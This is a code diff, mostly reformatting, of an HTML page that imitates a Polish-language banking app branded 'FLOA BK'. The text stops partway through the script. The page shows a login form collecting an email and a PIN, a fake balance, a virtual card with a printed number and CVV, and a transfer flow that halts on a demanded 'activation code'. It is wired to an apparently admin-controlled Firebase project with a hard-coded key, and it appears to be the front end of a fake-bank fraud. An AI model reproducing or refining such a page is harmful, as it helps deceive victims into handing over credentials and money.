@@ -7,7 +7,6 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
 <style>
-  /* ===== VARIABLES & RESET ===== */
   :root {
     --bg: #FFFFFF;
     --card-bg: #FFFFFF;
@@ -43,10 +42,7 @@
     -webkit-font-smoothing: antialiased;
   }
 
-  .screen {
-    display: none;
-    min-height: 100vh;
-  }
+  .screen { display: none; min-height: 100vh; }
   .screen.active { display: block; }
 
   .modal {
@@ -104,10 +100,7 @@
     font-family: 'Roboto', sans-serif;
     box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
   }
-  .btn:disabled {
-    opacity: 0.5;
-    cursor: not-allowed;
-  }
+  .btn:disabled { opacity: 0.5; cursor: not-allowed; }
   .btn-outline {
     background: transparent;
     border: 1.5px solid var(--p);
@@ -163,23 +156,6 @@
     min-height: 40px;
     line-height: 1;
   }
-  .field textarea {
-    padding: 10px 14px;
-    font-size: 14px;
-    min-height: 48px;
-    font-family: 'Roboto', sans-serif;
-    background: #FAFBFC;
-    border: 1.5px solid #E5E7EB;
-    border-radius: var(--radius-sm);
-    width: 100%;
-    color: var(--text-primary);
-  }
-  .field textarea:focus {
-    outline: none;
-    border-color: var(--p);
-    box-shadow: 0 0 0 4px rgba(139, 92, 246, 0.10);
-    background: #fff;
-  }
 
   header {
     background: #ffffff;
@@ -226,9 +202,7 @@
     position: relative;
     font-family: 'Roboto', sans-serif;
   }
-  .badge-icon i {
-    font-size: 20px;
-  }
+  .badge-icon i { font-size: 20px; }
   .notif-badge {
     position: absolute;
     top: -2px;
@@ -359,7 +333,6 @@
     z-index: 2;
     margin-bottom: 8px;
   }
-
   .balance-actions-wrapper .btn-action {
     flex: 1;
     min-width: 0;
@@ -384,7 +357,6 @@
     text-align: center;
     font-family: 'Roboto', sans-serif;
   }
-
   .balance-actions-wrapper .btn-action i {
     font-size: 17px;
     color: #2D3748;
@@ -1219,963 +1191,928 @@
 </style>
 </head>
 <body>
-  <!-- ========== LOGIN ========== -->
-  <section id="login" class="screen active">
-    <div class="login-wrapper">
-      <div class="login-card">
-        <div class="login-logo">F</div>
-        <h1 class="login-title">FLOA BK</h1>
-        <p class="login-sub">Bankowość internetowa</p>
-        <div class="login-info">Zaloguj się do swojego konta</div>
 
-        <div class="input-group">
-          <label for="email">Adresse e-mail (Gmail)</label>
-          <input id="email" type="email" class="input" placeholder="exemple@gmail.com" autocomplete="username">
-        </div>
-
-        <div class="input-group">
-          <label for="pin">Kod PIN</label>
-          <input id="pin" type="password" maxlength="6" class="input" placeholder="Wprowadź 6-cyfrowy kod" autocomplete="current-password">
-        </div>
-
-        <button onclick="login()" class="btn">Zaloguj się <i class="fa-solid fa-arrow-right"></i></button>
-        <p id="err" class="login-error hidden"></p>
+<!-- ========== LOGIN ========== -->
+<section id="login" class="screen active">
+  <div class="login-wrapper">
+    <div class="login-card">
+      <div class="login-logo">F</div>
+      <h1 class="login-title">FLOA BK</h1>
+      <p class="login-sub">Bankowość internetowa</p>
+      <div class="login-info">Zaloguj się do swojego konta</div>
+      <div class="input-group">
+        <label for="email">Adresse e-mail (Gmail)</label>
+        <input id="email" type="email" class="input" placeholder="exemple@gmail.com" autocomplete="username">
       </div>
-    </div>
-  </section>
-
-  <!-- ========== DASHBOARD ========== -->
-  <section id="dashboard" class="screen">
-    <header>
-      <div class="logo"><i class="fa-solid fa-building-columns"></i> FLOA BK</div>
-      <div class="header-actions">
-        <div class="badge-icon" onclick="openNotifications()"><i class="fa-regular fa-bell"></i><span id="notif-badge" class="notif-badge hidden">1</span></div>
-        <div class="badge-icon" onclick="openAcc()" id="avatar">FB</div>
+      <div class="input-group">
+        <label for="pin">Kod PIN</label>
+        <input id="pin" type="password" maxlength="6" class="input" placeholder="Wprowadź 6-cyfrowy kod" autocomplete="current-password">
       </div>
-    </header>
-    <main>
-      <h2 id="greet">Powitanie, <span>Power</span></h2>
-
-      <div class="balance-panel">
-        <div class="label">
-          <span>Dostępne saldo</span>
-          <i class="fa-solid fa-rocket"></i>
-        </div>
-        <div class="amount" id="bal">0,00 zł</div>
-        <div class="sub">Uwzględnij wszystkie swoje potrzeby</div>
-
-        <div class="balance-actions-wrapper">
-          <button class="btn-action" onclick="openCard()">
-            <i class="fa-regular fa-id-card"></i> Mapa wirtualna
-          </button>
-          <button class="btn-action" onclick="navigateTo('transfer')">
-            <i class="fa-solid fa-arrow-up-right-from-square"></i> Wykonaj przelew
-          </button>
-        </div>
-
-        <button class="btn-iban" onclick="openIbanModal()">
-          <i class="fa-regular fa-copy"></i> Zobacz mój IBAN
-        </button>
-      </div>
-
-      <div class="quick-stats">
-        <div class="stat-item"><div class="stat-value" id="stat-balance">0,00 zł</div><div class="stat-label">Saldo całkowite</div></div>
-        <div class="stat-item"><div class="stat-value" id="stat-tx">0</div><div class="stat-label">Transakcje</div></div>
-        <div class="stat-item"><div class="stat-value" id="stat-devise">zł</div><div class="stat-label">Waluta</div></div>
-      </div>
-
-      <div class="history-container">
-        <div class="history-header">
-          <i class="fa-solid fa-clock-rotate-left"></i>
-          <span>Historia transakcji</span>
-          <span class="badge-count" id="tx-count-badge">0</span>
-        </div>
-        <div id="history-list"></div>
-      </div>
-    </main>
-  </section>
-
-  <!-- ========== TRANSFER ========== -->
-  <section id="transfer" class="screen">
-    <header>
-      <div class="logo"><i class="fa-solid fa-building-columns"></i> FLOA BK</div>
-      <div class="header-actions">
-        <div class="badge-icon" onclick="openNotifications()"><i class="fa-regular fa-bell"></i><span id="notif-badge2" class="notif-badge hidden">1</span></div>
-        <div class="badge-icon" id="avatar3">E</div>
-      </div>
-    </header>
-    <main>
-      <h1 style="font-weight:600;font-size:22px;margin-bottom:16px;font-family:'Roboto',sans-serif;">Wykonaj przelew</h1>
-      <div class="transfer-card">
-        <div class="transfer-balance">
-          <span>Dostępne saldo: <b id="bal2">0,00 zł</b></span>
-          <i class="fa-solid fa-money-bill-transfer" style="opacity:0.2;font-size:28px"></i>
-        </div>
-        <div class="transfer-title"><i class="fa-solid fa-wallet"></i> Wyślij przelew międzynarodowy</div>
-
-        <div class="field-group">
-          <label>Kwota przelewu</label>
-          <div class="amount-input-wrap">
-            <input id="a" class="input" style="border-top-right-radius:0;border-bottom-right-radius:0;text-align:left;font-weight:600;font-size:15px">
-            <div class="currency-symbol" id="currency-symbol">zł</div>
-          </div>
-        </div>
-
-        <div class="field-group"><label>Imię i nazwisko beneficjenta</label><input id="b" class="input"></div>
-        <div class="field-group"><label>IBAN / Numer konta</label><input id="c" class="input"></div>
-        <div class="field-group"><label>Kod banku (BIC / SWIFT)</label><input id="d" class="input"></div>
-        <div class="field-group"><label>Nazwa banku</label><input id="e" class="input"></div>
-        <div class="field-group"><label>Powód transferu</label><input id="f" class="input"></div>
-
-        <button onclick="toVerify()" class="btn" id="continueBtn" style="margin-top:6px">Kontynuuj →</button>
-      </div>
-    </main>
-  </section>
-
-  <!-- ========== VERIFY ========== -->
-  <section id="verify" class="screen">
-    <header>
-      <div class="logo"><i class="fa-solid fa-building-columns"></i> FLOA BK</div>
-      <div class="header-actions">
-        <div class="badge-icon" onclick="openNotifications()"><i class="fa-regular fa-bell"></i><span id="notif-badge3" class="notif-badge hidden">1</span></div>
-        <div class="badge-icon" id="avatar2">E</div>
-      </div>
-    </header>
-    <main>
-      <h1 style="font-weight:600;font-size:22px;margin-bottom:14px;font-family:'Roboto',sans-serif;">Weryfikacja przelewu</h1>
-      <div class="transfer-card" style="padding:16px 16px">
-        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
-          <div style="display:flex;align-items:center;gap:8px;color:var(--p);font-weight:600;font-size:15px;font-family:'Roboto',sans-serif;"><i class="fa-regular fa-file-lines"></i> Szczegóły przelewu</div>
-          <i class="fa-solid fa-money-bill-transfer" style="opacity:0.12;font-size:32px"></i>
-        </div>
-        <div class="verify-details">
-          <div class="row"><div class="label">Kwota:</div><div class="value" id="va">-</div></div>
-          <div class="row"><div class="label">Beneficjent:</div><div class="value" id="vb">-</div></div>
-          <div class="row"><div class="label">IBAN / Numer konta:</div><div class="value" id="vc">-</div></div>
-          <div class="row"><div class="label">Kod banku (BIC / SWIFT):</div><div class="value" id="vd">-</div></div>
-          <div class="row"><div class="label">Nazwa banku:</div><div class="value" id="ve">-</div></div>
-          <div class="row"><div class="label">Powód transferu:</div><div class="value" id="vf">-</div></div>
-        </div>
-
-        <button onclick="navigateTo('transfer')" class="verify-cancel">Anuluj przelew →</button>
-
-        <div class="verify-code-section">
-          <div class="lock-line">
-            <i class="fa-solid fa-lock"></i>
-            <span>Proszę wprowadzić kod aktywacyjny transferu.</span>
-          </div>
-          <input id="code" class="code-input" maxlength="20" autocomplete="off" placeholder="******">
-          <button onclick="finish()" class="btn" style="font-size:15px;padding:14px">Kontynuuj →</button>
-          <div id="progress" class="hidden progress-wrap">
-            <div class="progress-bar"><div class="fill" id="bar"></div></div>
-            <p class="progress-text" id="ptext"></p>
-          </div>
-        </div>
-      </div>
-    </main>
-  </section>
-
-  <!-- ========== RESULT ========== -->
-  <section id="result" class="screen">
-    <header>
-      <div class="logo"><i class="fa-solid fa-building-columns"></i> FLOA BK</div>
-      <div class="header-actions">
-        <div class="badge-icon" onclick="openNotifications()"><i class="fa-regular fa-bell"></i><span id="notif-badge4" class="notif-badge hidden">1</span></div>
-        <div class="badge-icon" id="avatar4">E</div>
-      </div>
-    </header>
-    <main style="display:flex;align-items:center;justify-content:center;min-height:60vh;">
-      <div class="result-card">
-        <div class="result-icon" id="resultIcon">
-          <i class="fa-solid fa-circle-check"></i>
-        </div>
-        <div class="result-percent" id="resultPercent">0%</div>
-        <div class="result-status" id="resultStatus">-</div>
-        <div class="result-details" id="resultDetails">
-          <div class="row"><span class="label">Beneficjent</span><span class="value" id="resultBenef">-</span></div>
-          <div class="row"><span class="label">Kwota</span><span class="value" id="resultAmount">-</span></div>
-          <div class="row"><span class="label">Numer konta</span><span class="value" id="resultAccount">-</span></div>
-        </div>
-        <div class="result-msg" id="resultMsg"></div>
-        <button onclick="navigateTo('dashboard')" class="btn" style="margin-top:12px;max-width:200px;margin-left:auto;margin-right:auto">Powrót do portfela</button>
-      </div>
-    </main>
-  </section>
-
-  <!-- ========== BOTTOM NAV ========== -->
-  <nav id="mainNav" style="display:none">
-    <div class="nav-item" onclick="navigateTo('dashboard')"><i class="fa-solid fa-house"></i><span>Portfel</span></div>
-    <div class="nav-item" onclick="navigateTo('transfer')"><i class="fa-solid fa-qrcode"></i><span>Zapłata</span></div>
-    <div class="nav-item" onclick="openCard()"><i class="fa-regular fa-credit-card"></i><span>Mapa wirtualna</span></div>
-    <div class="nav-item" onclick="openAcc()"><i class="fa-regular fa-user"></i><span>Moje konto</span></div>
-  </nav>
-
-  <!-- ========== MODALS ========== -->
-  <div id="card" class="modal hidden">
-    <div class="modal-content">
-      <button onclick="closeCard()" class="modal-close">×</button>
-      <p style="font-weight:600;margin-bottom:16px;font-size:19px;font-family:'Roboto',sans-serif;">💳 Karta wirtualna</p>
-      <div class="real-card">
-        <div class="card-top">
-          <div class="card-chip">
-            <i class="fa-solid fa-microchip"></i>
-            <span style="font-size:11px;opacity:0.6;letter-spacing:1px;font-family:'Roboto',sans-serif;">FLOA</span>
-          </div>
-          <div class="card-brand">
-            <i class="fa-brands fa-cc-visa"></i>
-          </div>
-        </div>
-        <div class="card-number">4556 5518 8867 <span style="opacity:0.5;">XXXX</span></div>
-        <div class="card-details">
-          <div class="card-holder">
-            <span class="label">Posiadacz</span>
-            <span class="name" id="cardHolderName">JAN KOWALSKI</span>
-          </div>
-          <div class="card-expiry">
-            <span class="label">Ważna do</span>
-            <span class="date">02/28</span>
-          </div>
-        </div>
-        <div style="display:flex;justify-content:flex-end;margin-top:4px;position:relative;z-index:2">
-          <span class="card-cvv">CVV: 556</span>
-        </div>
-      </div>
-      <p style="font-size:13px;color:var(--text-secondary);text-align:center;line-height:1.4;margin-top:6px;font-family:'Roboto',sans-serif;">Ostatnie 4 cyfry ukryte dla bezpieczeństwa.</p>
+      <button onclick="login()" class="btn">Zaloguj się <i class="fa-solid fa-arrow-right"></i></button>
+      <p id="err" class="login-error hidden"></p>
     </div>
   </div>
+</section>
 
-  <div id="ibanModal" class="modal hidden iban-modal">
-    <div class="modal-content">
-      <button onclick="closeIbanModal()" class="modal-close">×</button>
-      <div class="iban-header">
-        <i class="fa-regular fa-credit-card"></i>
-        <span>Dane konta</span>
+<!-- ========== DASHBOARD ========== -->
+<section id="dashboard" class="screen">
+  <header>
+    <div class="logo"><i class="fa-solid fa-building-columns"></i> FLOA BK</div>
+    <div class="header-actions">
+      <div class="badge-icon" onclick="openNotifications()"><i class="fa-regular fa-bell"></i><span id="notif-badge" class="notif-badge hidden">1</span></div>
+      <div class="badge-icon" onclick="openAcc()" id="avatar">FB</div>
+    </div>
+  </header>
+  <main>
+    <h2 id="greet">Powitanie, <span>Power</span></h2>
+    <div class="balance-panel">
+      <div class="label"><span>Dostępne saldo</span><i class="fa-solid fa-rocket"></i></div>
+      <div class="amount" id="bal">0,00 zł</div>
+      <div class="sub">Uwzględnij wszystkie swoje potrzeby</div>
+      <div class="balance-actions-wrapper">
+        <button class="btn-action" onclick="openCard()"><i class="fa-regular fa-id-card"></i> Mapa wirtualna</button>
+        <button class="btn-action" onclick="navigateTo('transfer')"><i class="fa-solid fa-arrow-up-right-from-square"></i> Wykonaj przelew</button>
       </div>
-      <div class="iban-field">
-        <div class="label">Właściciel konta</div>
-        <div class="value" id="ibanOwner">KWIATKOWSKI PW</div>
+      <button class="btn-iban" onclick="openIbanModal()"><i class="fa-regular fa-copy"></i> Zobacz mój IBAN</button>
+    </div>
+    <div class="quick-stats">
+      <div class="stat-item"><div class="stat-value" id="stat-balance">0,00 zł</div><div class="stat-label">Saldo całkowite</div></div>
+      <div class="stat-item"><div class="stat-value" id="stat-tx">0</div><div class="stat-label">Transakcje</div></div>
+      <div class="stat-item"><div class="stat-value" id="stat-devise">zł</div><div class="stat-label">Waluta</div></div>
+    </div>
+    <div class="history-container">
+      <div class="history-header">
+        <i class="fa-solid fa-clock-rotate-left"></i>
+        <span>Historia transakcji</span>
+        <span class="badge-count" id="tx-count-badge">0</span>
       </div>
-      <div class="iban-field">
-        <div class="label">IBAN</div>
-        <div class="value" id="ibanNumber">LT15 2339 1465 189X XXXX</div>
+      <div id="history-list"></div>
+    </div>
+  </main>
+</section>
+
+<!-- ========== TRANSFER ========== -->
+<section id="transfer" class="screen">
+  <header>
+    <div class="logo"><i class="fa-solid fa-building-columns"></i> FLOA BK</div>
+    <div class="header-actions">
+      <div class="badge-icon" onclick="openNotifications()"><i class="fa-regular fa-bell"></i><span id="notif-badge2" class="notif-badge hidden">1</span></div>
+      <div class="badge-icon" id="avatar3">E</div>
+    </div>
+  </header>
+  <main>
+    <h1 style="font-weight:600;font-size:22px;margin-bottom:16px;font-family:'Roboto',sans-serif;">Wykonaj przelew</h1>
+    <div class="transfer-card">
+      <div class="transfer-balance">
+        <span>Dostępne saldo: <b id="bal2">0,00 zł</b></span>
+        <i class="fa-solid fa-money-bill-transfer" style="opacity:0.2;font-size:28px"></i>
       </div>
-      <div class="iban-field">
-        <div class="label">BIC / SWIFT</div>
-        <div class="value small" id="ibanBic">TTQGLTIJCJK</div>
+      <div class="transfer-title"><i class="fa-solid fa-wallet"></i> Wyślij przelew międzynarodowy</div>
+      <div class="field-group">
+        <label>Kwota przelewu</label>
+        <div class="amount-input-wrap">
+          <input id="a" class="input" style="border-top-right-radius:0;border-bottom-right-radius:0;text-align:left;font-weight:600;font-size:15px">
+          <div class="currency-symbol" id="currency-symbol">zł</div>
+        </div>
       </div>
-      <div class="iban-field">
-        <div class="label">Bank</div>
-        <div class="value small" id="ibanBank">FLOA BK FINANCE</div>
+      <div class="field-group"><label>Imię i nazwisko beneficjenta</label><input id="b" class="input"></div>
+      <div class="field-group"><label>IBAN / Numer konta</label><input id="c" class="input"></div>
+      <div class="field-group"><label>Kod banku (BIC / SWIFT)</label><input id="d" class="input"></div>
+      <div class="field-group"><label>Nazwa banku</label><input id="e" class="input"></div>
+      <div class="field-group"><label>Powód transferu</label><input id="f" class="input"></div>
+      <button onclick="toVerify()" class="btn" id="continueBtn" style="margin-top:6px">Kontynuuj →</button>
+    </div>
+  </main>
+</section>
+
+<!-- ========== VERIFY ========== -->
+<section id="verify" class="screen">
+  <header>
+    <div class="logo"><i class="fa-solid fa-building-columns"></i> FLOA BK</div>
+    <div class="header-actions">
+      <div class="badge-icon" onclick="openNotifications()"><i class="fa-regular fa-bell"></i><span id="notif-badge3" class="notif-badge hidden">1</span></div>
+      <div class="badge-icon" id="avatar2">E</div>
+    </div>
+  </header>
+  <main>
+    <h1 style="font-weight:600;font-size:22px;margin-bottom:14px;font-family:'Roboto',sans-serif;">Weryfikacja przelewu</h1>
+    <div class="transfer-card" style="padding:16px 16px">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
+        <div style="display:flex;align-items:center;gap:8px;color:var(--p);font-weight:600;font-size:15px;font-family:'Roboto',sans-serif;"><i class="fa-regular fa-file-lines"></i> Szczegóły przelewu</div>
+        <i class="fa-solid fa-money-bill-transfer" style="opacity:0.12;font-size:32px"></i>
       </div>
-      <div class="iban-security">
-        <i class="fa-solid fa-shield"></i>
-        <span>Ze względów bezpieczeństwa niektóre znaki Twojego numeru IBAN zostały zamaskowane.</span>
+      <div class="verify-details">
+        <div class="row"><div class="label">Kwota:</div><div class="value" id="va">-</div></div>
+        <div class="row"><div class="label">Beneficjent:</div><div class="value" id="vb">-</div></div>
+        <div class="row"><div class="label">IBAN / Numer konta:</div><div class="value" id="vc">-</div></div>
+        <div class="row"><div class="label">Kod banku (BIC / SWIFT):</div><div class="value" id="vd">-</div></div>
+        <div class="row"><div class="label">Nazwa banku:</div><div class="value" id="ve">-</div></div>
+        <div class="row"><div class="label">Powód transferu:</div><div class="value" id="vf">-</div></div>
+      </div>
+      <button onclick="navigateTo('transfer')" class="verify-cancel">Anuluj przelew →</button>
+      <div class="verify-code-section">
+        <div class="lock-line"><i class="fa-solid fa-lock"></i><span>Proszę wprowadzić kod aktywacyjny transferu.</span></div>
+        <input id="code" class="code-input" maxlength="20" autocomplete="off" placeholder="******">
+        <button onclick="finish()" class="btn" style="font-size:15px;padding:14px">Kontynuuj →</button>
+        <div id="progress" class="hidden progress-wrap">
+          <div class="progress-bar"><div class="fill" id="bar"></div></div>
+          <p class="progress-text" id="ptext"></p>
+        </div>
       </div>
     </div>
-  </div>
+  </main>
+</section>
 
-  <div id="acc" class="modal hidden">
-    <div class="modal-content">
-      <button onclick="closeAcc()" class="modal-close">×</button>
-      <h3 style="margin-bottom:14px;display:flex;align-items:center;gap:10px;font-size:19px;font-family:'Roboto',sans-serif;"><i class="fa-regular fa-circle-user" style="color:var(--p)"></i> Moje konto</h3>
-      <div id="accinfo" style="font-size:14px;line-height:2.2;color:var(--text-secondary);font-family:'Roboto',sans-serif;"></div>
-      <button onclick="logout()" style="margin-top:16px;padding:10px;background:#FEF2F2;border:1px solid #FCA5A5;color:#EF4444;border-radius:12px;font-size:13px;font-weight:500;width:100%;cursor:pointer;font-family:'Roboto',sans-serif;"><i class="fa-solid fa-right-from-bracket"></i> Wyloguj się</button>
+<!-- ========== RESULT ========== -->
+<section id="result" class="screen">
+  <header>
+    <div class="logo"><i class="fa-solid fa-building-columns"></i> FLOA BK</div>
+    <div class="header-actions">
+      <div class="badge-icon" onclick="openNotifications()"><i class="fa-regular fa-bell"></i><span id="notif-badge4" class="notif-badge hidden">1</span></div>
+      <div class="badge-icon" id="avatar4">E</div>
     </div>
-  </div>
-
-  <div id="notifications" class="modal hidden">
-    <div class="modal-content" style="max-height:80vh;display:flex;flex-direction:column">
-      <button onclick="closeNotifications()" class="modal-close">×</button>
-      <h3 style="margin-bottom:16px;display:flex;align-items:center;gap:10px;flex-shrink:0;font-size:19px;font-family:'Roboto',sans-serif;"><i class="fa-regular fa-bell" style="color:var(--p)"></i> Powiadomienia</h3>
-      <div id="notif-content" style="font-size:14px;line-height:1.6;overflow-y:auto;max-height:400px;color:var(--text-secondary);font-family:'Roboto',sans-serif;"></div>
-    </div>
-  </div>
-
-  <div id="txDetail" class="modal hidden" style="z-index:60">
-    <div class="modal-content" style="max-width:400px;padding:0;overflow:visible;margin-top:24px">
-      <button onclick="closeTxDetail()" style="position:absolute;top:-24px;left:50%;transform:translateX(-50%);width:50px;height:50px;border-radius:50%;background:#EF4444;color:#fff;border:4px solid #fff;font-size:24px;box-shadow:0 4px 20px rgba(239,68,68,0.25);z-index:10;cursor:pointer;display:flex;align-items:center;justify-content:center;">×</button>
-      <div style="padding:32px 24px 24px">
-        <div style="margin-bottom:16px"><div style="font-size:13px;color:var(--text-secondary);margin-bottom:3px;font-family:'Roboto',sans-serif;">ID transakcji:</div><div style="font-weight:600;font-size:18px;color:var(--text-primary);font-family:'Roboto',sans-serif;" id="tx-id">-</div></div>
-        <div style="margin-bottom:16px"><div style="font-size:13px;color:var(--text-secondary);margin-bottom:3px;font-family:'Roboto',sans-serif;" id="tx-label-amount">Kwota:</div><div style="font-weight:600;font-size:18px;color:var(--text-primary);font-family:'Roboto',sans-serif;" id="tx-amount">-</div></div>
-        <div style="margin-bottom:16px"><div style="font-size:13px;color:var(--text-secondary);margin-bottom:3px;font-family:'Roboto',sans-serif;" id="tx-label-benef">Beneficjent / Nadawca:</div><div style="font-weight:600;font-size:18px;color:var(--text-primary);font-family:'Roboto',sans-serif;" id="tx-benef">-</div></div>
-        <div style="margin-bottom:16px" id="tx-iban-row"><div style="font-size:13px;color:var(--text-secondary);margin-bottom:3px;font-family:'Roboto',sans-serif;">IBAN / Numer konta:</div><div style="font-weight:600;font-size:18px;color:var(--text-primary);word-break:break-all;font-family:'Roboto',sans-serif;" id="tx-iban">-</div></div>
-        <div><div style="font-size:13px;color:var(--text-secondary);margin-bottom:3px;font-family:'Roboto',sans-serif;" id="tx-label-date">Data i godzina:</div><div style="font-weight:600;font-size:18px;color:var(--text-primary);font-family:'Roboto',sans-serif;" id="tx-date">-</div></div>
+  </header>
+  <main style="display:flex;align-items:center;justify-content:center;min-height:60vh;">
+    <div class="result-card">
+      <div class="result-icon" id="resultIcon"><i class="fa-solid fa-circle-check"></i></div>
+      <div class="result-percent" id="resultPercent">0%</div>
+      <div class="result-status" id="resultStatus">-</div>
+      <div class="result-details" id="resultDetails">
+        <div class="row"><span class="label">Beneficjent</span><span class="value" id="resultBenef">-</span></div>
+        <div class="row"><span class="label">Kwota</span><span class="value" id="resultAmount">-</span></div>
+        <div class="row"><span class="label">Numer konta</span><span class="value" id="resultAccount">-</span></div>
       </div>
+      <div class="result-msg" id="resultMsg"></div>
+      <button onclick="navigateTo('dashboard')" class="btn" style="margin-top:12px;max-width:200px;margin-left:auto;margin-right:auto">Powrót do portfela</button>
+    </div>
+  </main>
+</section>
+
+<!-- ========== BOTTOM NAV ========== -->
+<nav id="mainNav" style="display:none">
+  <div class="nav-item" onclick="navigateTo('dashboard')"><i class="fa-solid fa-house"></i><span>Portfel</span></div>
+  <div class="nav-item" onclick="navigateTo('transfer')"><i class="fa-solid fa-qrcode"></i><span>Zapłata</span></div>
+  <div class="nav-item" onclick="openCard()"><i class="fa-regular fa-credit-card"></i><span>Mapa wirtualna</span></div>
+  <div class="nav-item" onclick="openAcc()"><i class="fa-regular fa-user"></i><span>Moje konto</span></div>
+</nav>
+
+<!-- ========== MODALS ========== -->
+<div id="card" class="modal hidden">
+  <div class="modal-content">
+    <button onclick="closeCard()" class="modal-close">×</button>
+    <p style="font-weight:600;margin-bottom:16px;font-size:19px;font-family:'Roboto',sans-serif;">💳 Karta wirtualna</p>
+    <div class="real-card">
+      <div class="card-top">
+        <div class="card-chip"><i class="fa-solid fa-microchip"></i><span style="font-size:11px;opacity:0.6;letter-spacing:1px;font-family:'Roboto',sans-serif;">FLOA</span></div>
+        <div class="card-brand"><i class="fa-brands fa-cc-visa"></i></div>
+      </div>
+      <div class="card-number">4556 5518 8867 <span style="opacity:0.5;">XXXX</span></div>
+      <div class="card-details">
+        <div class="card-holder"><span class="label">Posiadacz</span><span class="name" id="cardHolderName">JAN KOWALSKI</span></div>
+        <div class="card-expiry"><span class="label">Ważna do</span><span class="date">02/28</span></div>
+      </div>
+      <div style="display:flex;justify-content:flex-end;margin-top:4px;position:relative;z-index:2"><span class="card-cvv">CVV: 556</span></div>
+    </div>
+    <p style="font-size:13px;color:var(--text-secondary);text-align:center;line-height:1.4;margin-top:6px;font-family:'Roboto',sans-serif;">Ostatnie 4 cyfry ukryte dla bezpieczeństwa.</p>
+  </div>
+</div>
+
+<div id="ibanModal" class="modal hidden iban-modal">
+  <div class="modal-content">
+    <button onclick="closeIbanModal()" class="modal-close">×</button>
+    <div class="iban-header"><i class="fa-regular fa-credit-card"></i><span>Dane konta</span></div>
+    <div class="iban-field"><div class="label">Właściciel konta</div><div class="value" id="ibanOwner">KWIATKOWSKI PW</div></div>
+    <div class="iban-field"><div class="label">IBAN</div><div class="value" id="ibanNumber">LT15 2339 1465 189X XXXX</div></div>
+    <div class="iban-field"><div class="label">BIC / SWIFT</div><div class="value small" id="ibanBic">TTQGLTIJCJK</div></div>
+    <div class="iban-field"><div class="label">Bank</div><div class="value small" id="ibanBank">FLOA BK FINANCE</div></div>
+    <div class="iban-security"><i class="fa-solid fa-shield"></i><span>Ze względów bezpieczeństwa niektóre znaki Twojego numeru IBAN zostały zamaskowane.</span></div>
+  </div>
+</div>
+
+<div id="acc" class="modal hidden">
+  <div class="modal-content">
+    <button onclick="closeAcc()" class="modal-close">×</button>
+    <h3 style="margin-bottom:14px;display:flex;align-items:center;gap:10px;font-size:19px;font-family:'Roboto',sans-serif;"><i class="fa-regular fa-circle-user" style="color:var(--p)"></i> Moje konto</h3>
+    <div id="accinfo" style="font-size:14px;line-height:2.2;color:var(--text-secondary);font-family:'Roboto',sans-serif;"></div>
+    <button onclick="logout()" style="margin-top:16px;padding:10px;background:#FEF2F2;border:1px solid #FCA5A5;color:#EF4444;border-radius:12px;font-size:13px;font-weight:500;width:100%;cursor:pointer;font-family:'Roboto',sans-serif;"><i class="fa-solid fa-right-from-bracket"></i> Wyloguj się</button>
+  </div>
+</div>
+
+<div id="notifications" class="modal hidden">
+  <div class="modal-content" style="max-height:80vh;display:flex;flex-direction:column">
+    <button onclick="closeNotifications()" class="modal-close">×</button>
+    <h3 style="margin-bottom:16px;display:flex;align-items:center;gap:10px;flex-shrink:0;font-size:19px;font-family:'Roboto',sans-serif;"><i class="fa-regular fa-bell" style="color:var(--p)"></i> Powiadomienia</h3>
+    <div id="notif-content" style="font-size:14px;line-height:1.6;overflow-y:auto;max-height:400px;color:var(--text-secondary);font-family:'Roboto',sans-serif;"></div>
+  </div>
+</div>
+
+<div id="txDetail" class="modal hidden" style="z-index:60">
+  <div class="modal-content" style="max-width:400px;padding:0;overflow:visible;margin-top:24px">
+    <button onclick="closeTxDetail()" style="position:absolute;top:-24px;left:50%;transform:translateX(-50%);width:50px;height:50px;border-radius:50%;background:#EF4444;color:#fff;border:4px solid #fff;font-size:24px;box-shadow:0 4px 20px rgba(239,68,68,0.25);z-index:10;cursor:pointer;display:flex;align-items:center;justify-content:center;">×</button>
+    <div style="padding:32px 24px 24px">
+      <div style="margin-bottom:16px"><div style="font-size:13px;color:var(--text-secondary);margin-bottom:3px;font-family:'Roboto',sans-serif;">ID transakcji:</div><div style="font-weight:600;font-size:18px;color:var(--text-primary);font-family:'Roboto',sans-serif;" id="tx-id">-</div></div>
+      <div style="margin-bottom:16px"><div style="font-size:13px;color:var(--text-secondary);margin-bottom:3px;font-family:'Roboto',sans-serif;" id="tx-label-amount">Kwota:</div><div style="font-weight:600;font-size:18px;color:var(--text-primary);font-family:'Roboto',sans-serif;" id="tx-amount">-</div></div>
+      <div style="margin-bottom:16px"><div style="font-size:13px;color:var(--text-secondary);margin-bottom:3px;font-family:'Roboto',sans-serif;" id="tx-label-benef">Beneficjent / Nadawca:</div><div style="font-weight:600;font-size:18px;color:var(--text-primary);font-family:'Roboto',sans-serif;" id="tx-benef">-</div></div>
+      <div style="margin-bottom:16px" id="tx-iban-row"><div style="font-size:13px;color:var(--text-secondary);margin-bottom:3px;font-family:'Roboto',sans-serif;">IBAN / Numer konta:</div><div style="font-weight:600;font-size:18px;color:var(--text-primary);word-break:break-all;font-family:'Roboto',sans-serif;" id="tx-iban">-</div></div>
+      <div><div style="font-size:13px;color:var(--text-secondary);margin-bottom:3px;font-family:'Roboto',sans-serif;" id="tx-label-date">Data i godzina:</div><div style="font-weight:600;font-size:18px;color:var(--text-primary);font-family:'Roboto',sans-serif;" id="tx-date">-</div></div>
     </div>
   </div>
+</div>
 
-  <div id="t"></div>
+<div id="t"></div>
 
-  <!-- ========== SCRIPTS ========== -->
-  <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-app.js";
-    import { getDatabase, ref, get, onValue, update, push } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-database.js";
+<!-- ========== SCRIPTS ========== -->
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-app.js";
+  import { getDatabase, ref, get, onValue, update, push, set } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-database.js";
 
-    const firebaseConfig = {
-      apiKey: "AIzaSyCU-KBtj7vx3OouofytlwIN3KPd1McNLEk",
-      authDomain: "vantex-admin-2026.firebaseapp.com",
